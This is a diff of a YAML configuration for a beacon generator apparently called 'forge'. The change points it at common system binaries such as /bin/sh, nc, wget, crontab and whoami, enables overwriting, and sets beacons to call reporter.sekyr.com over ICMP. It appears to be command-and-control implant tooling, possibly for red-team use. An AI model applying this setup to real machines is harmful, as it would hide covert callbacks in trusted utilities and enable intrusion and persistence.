@@ -8,33 +8,22 @@ addr: https://gateway.sekyr.com
 
 # file path for binaries to convert into beacon
 #files: ["./testFiles/ls_darwin","./testFiles/ls_darwin1","./testFiles/ls_darwin2","./testFiles/ls_darwin3"]
-files: ["./testFiles/ls_darwin"]
+files: ["/usr/bin/md5sum","/usr/bin/sha256sum","/usr/bin/nc","/bin/sh", "/usr/bin/crontab", "/sbin/ip","/usr/bin/wget","/sbin/apk","/bin/base64","/bin/chmod","/bin/echo","/bin/hostname","/bin/pwd", "/bin/sed", "/bin/tar","/usr/bin/id","/usr/bin/awk","/usr/bin/whoami", "/usr/bin/find"]
+#files: ["/usr/bin/id"]
 
-# enable verbose output for forge
+# enable verbose output for forge:
 verbose: true
-
 # output folder for the beacons
 output: out
 #Overwrite the beacons, this overrides the output flag
-#overwrite: false
+overwrite: true
+
+# transport tag for the beacon
+transport: icmp
 
 # connection string for the beacon
-connection-string: sekyr.com:53
+connection-string: reporter.sekyr.com
 
-# goarch for the beacon
-#arch: amd64
-
-# goos for the beacon
-#os: darwin
-
-# lldflags for the beacon
-#lldflags: -s -w
-
-# static binary for the beacon
-#static: false
-
-# gzip the beacon
-#gzip: true
 
 # upx the beacon
 #upx: false
@@ -42,8 +31,6 @@ connection-string: sekyr.com:53
 # upx level for the beacon
 #upx-level: 1
 
-# transport tag for the beacon
-transport: dns
 
 # debug output for the beacon
-debug: true
+debug: false
